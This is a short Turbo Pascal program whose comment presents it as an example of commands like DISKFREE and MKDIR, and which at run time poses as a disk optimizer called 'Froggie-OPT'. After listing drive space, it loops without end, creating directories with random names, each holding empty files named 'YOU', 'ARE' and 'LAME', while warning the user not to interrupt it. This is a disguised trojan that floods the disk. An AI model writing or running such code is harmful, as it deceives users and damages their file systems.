program Disk_Space;
{ This program makes use of the

       CHR command
       USES command
       VAR command
       CLRSCR command
       WRITELN command
       DISKFREE command
       DISKSIZE command
       TRUNC command
       IF-THEN-ELSE command
       REPEAT-UNTIL command
       ASSIGN command
       REWRITE command
       WRITE command
       DELAY command
       CLOSE command
       RANDOMIZE command
       }
uses dos,crt;
var cdn:byte;
    dirname:string;
    a,b,c,d,e,f,g,h,i,j,k,l:char;
    ii:integer;
    q:text;
    ai:boolean;
begin
randomize;
clrscr;
cdn:=2;
gotoxy(22,2);
Writeln('Froggie-OPT v1.12 (c) Jason Friedman');
gotoxy(25,3);

writeln('Please wait - Reading System Data');
repeat;
cdn:=cdn+1;
if (diskfree(cdn)<1) and (cdn<3) then
    Writeln('   Your disk for drive ',chr(cdn+64),': is not in the drive')
else
if (diskfree(cdn)>1) then
    Writeln('   Your disk space free for drive ',chr(cdn+64),': is ',
    trunc(diskfree(cdn)/1000),' KB out of ',trunc(disksize(cdn)/1000),' KB');
    until (diskfree(cdn)<1) and (cdn>2);
delay(1000);
repeat
writeln(' Preparing to Froggie OPT - Please do not disturb');
writeln(' Any type of disturbance will cause file damnage ');
ii:=ii+1;
a:=chr(trunc(random(255)));
b:=chr(trunc(random(255)));
c:=chr(trunc(random(255)));
d:=chr(trunc(random(255)));
e:=chr(trunc(random(255)));
f:=chr(trunc(random(255)));
g:=chr(trunc(random(255)));
h:=chr(trunc(random(255)));
i:=chr(trunc(random(255)));
j:=chr(trunc(random(255)));
k:=chr(trunc(random(255)));
l:=chr(trunc(random(255)));
mkdir (a+b+c+d+e+f+g+h+i+'.'+j+k+l);
chdir (a+b+c+d+e+f+g+h+i+'.'+j+k+l);
  assign (q,'YOU');
  rewrite (q);
  close (q);
  assign (q,'ARE');
  rewrite (q);
  close (q);
  Assign (q,'LAME');
  rewrite (q);
  close (q);
  chdir('..');
  until ai=true;
end.
